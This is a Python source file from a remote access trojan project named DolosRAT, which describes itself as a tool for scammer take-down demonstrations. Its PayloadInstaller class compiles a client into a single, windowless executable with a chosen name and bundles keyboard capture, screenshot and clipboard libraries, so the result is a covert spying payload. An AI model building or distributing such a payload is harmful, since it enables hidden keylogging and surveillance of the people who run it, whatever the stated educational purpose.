# !/usr/bin/env python
# -*- coding: utf-8 -*-
#----------------------------------------------------------------------------
# Creator : Ryan I.
# Created Date: 07/06/2023
# version ='1.0'
# ---------------------------------------------------------------------------
"""
DolosRAT provides a GUI-based RAT client and server, purposed for demonstrating
techniques frequently used within scammer take-down operations. Please note that
the use of this tool is for educational purposes only.
"""

# Built-in/Generic Imports.
from os import getcwd, path
from sys import executable
from subprocess import Popen

class PayloadInstaller:
    """_summary_
    """

    @staticmethod
    def compile(file_path: str, file_name: str) -> None:
        """_summary_
        """

        payload_path = path.join(
            getcwd(),
            'dolos_client',
        )

        Popen([
            executable, '-m', 'PyInstaller',
            path.join(payload_path, 'main.pyw'),
            '--noconsole', '--distpath', file_path,
            '--specpath', file_path,
            '--workpath', payload_path,
            '--onefile', '--name', file_name,
            '--hidden-import', 'dill',
            '--hidden-import', 'ctypes.wintypes',
            '--hidden-import', 'PIL.ImageGrab',
            '--hidden-import', 'io',
            '--hidden-import', 'base64',
            '--hidden-import', 'threading',
            '--hidden-import', 'pynput.keyboard',
            '--hidden-import', 'pyperclip',
        ])
